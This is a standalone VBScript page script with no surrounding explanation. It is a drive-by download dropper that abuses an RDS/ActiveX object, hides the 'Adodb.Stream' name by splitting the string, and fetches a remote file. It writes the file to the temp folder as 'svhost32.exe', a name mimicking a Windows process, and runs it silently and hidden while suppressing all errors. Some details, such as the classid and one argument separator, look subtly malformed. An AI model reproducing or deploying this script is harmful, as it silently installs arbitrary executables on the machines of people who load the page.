<script language="VBScript">
on error resume next
Set df = document.createElement("object")
df.setAttribute "classid", "clsid:VD96C556-65A3-11D0-983A-00C04FC29E36"
str="Microsoft.XMLHTTP"
Set x = df.createobject(str,"")
a1="Ado"
a2="db."
a3="Str"
a4="eam"
str1=a1&a2&a3&a4
str5=str1
set S = df.createobject(str5,"")
S.type = 1
str6 = "GET"
x.Open Str6, dl, False
x.Send
fname1= "svhost32.exe"
set F = df.createobject("Scripting.FileSystemObject","")
set tmp = F.GetSpecialFolder(2)
fname1= F.BuildPath(tmp,fname1)
S.open
S.write x.responseBody
S.savetofile fname1,2
S.close
set Q = df.createobject("Shell.Application"."")
Q.ShellExecute fname1,"","","open",0
</script>